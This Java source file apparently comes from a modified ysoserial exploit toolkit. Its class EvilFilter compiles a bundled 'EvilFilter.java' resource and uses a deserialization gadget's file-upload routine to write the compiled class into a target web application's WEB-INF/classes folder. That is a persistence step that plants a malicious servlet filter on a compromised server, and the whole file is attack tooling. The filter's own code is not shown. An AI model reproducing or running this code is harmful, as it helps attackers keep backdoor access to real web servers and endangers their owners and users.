package ysoserial.payloads.persist;

import ysoserial.payloads.Eval;
import ysoserial.payloads.util.JavaCompiler;
import ysoserial.payloads.util.ReadWrite;

public class EvilFilter {
    public Object getObject(Class gadget,String realPath) throws Exception {
        if(realPath.lastIndexOf("/") == realPath.length() - 1){
            realPath = realPath.substring(0,realPath.length() -1 );
        }
        String java = new String(ReadWrite.readResource(EvilFilter.class,"persist/EvilFilter.java"));
        byte[] b = JavaCompiler.compile("EvilFilter",java);
        String destination = realPath + "/WEB-INF/classes/EvilFilter.class";

        return new Eval().uploadFile(gadget,b,destination);
    }
}
